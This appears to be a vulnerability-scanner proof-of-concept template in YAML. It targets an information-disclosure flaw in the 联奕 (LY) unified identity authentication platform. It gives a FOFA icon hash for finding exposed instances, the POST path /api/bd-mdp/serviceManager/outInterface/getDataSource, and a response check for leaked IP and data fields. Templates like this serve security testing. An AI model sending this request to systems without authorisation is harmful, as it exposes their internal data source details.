id: poc-yaml-ly-sky-getdatasource-info-leak
info:
  name: 联奕统一身份认证平台 getDataSource 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 联奕统一身份认证平台
  fofa: icon_hash="772658742"
requests:
- method: POST
  path: /api/bd-mdp/serviceManager/outInterface/getDataSource
  headers:
    Content-Type: application/x-www-form-urlencoded
  expression: status_code == 200 && contains(content_type,"application/json") && contains(headers,"ly-gateway-server-svc:1101")
    && contains(body,"\"ip\":") && contains(body,"\"data\":")
variables: {}
transport: http
